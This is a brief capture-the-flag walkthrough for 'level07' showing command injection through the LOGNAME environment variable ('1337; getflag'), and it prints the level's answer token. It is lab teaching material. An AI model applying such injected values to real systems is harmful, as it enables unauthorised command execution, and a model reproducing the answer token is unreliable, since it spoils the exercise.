# Level07 Walkthrough

## Overview

This level exploits an environment variable injection vulnerability. The program uses the `LOGNAME` variable without proper sanitization, allowing command execution.

## Walkthrough

### 1. Inject malicious input into LOGNAME

Set the `LOGNAME` environment variable to include a command:

```bash id="m2x8qp"
export LOGNAME="1337; getflag"
```

### 2. Execute the vulnerable binary

Run the program:

```bash id="n5v3ls"
./level07
```

### 3. Retrieve the flag

The injected command is executed, revealing the token.

## Token

```text id="p9k1zw"
fiumuikeil55xe9cu4dood66h
```

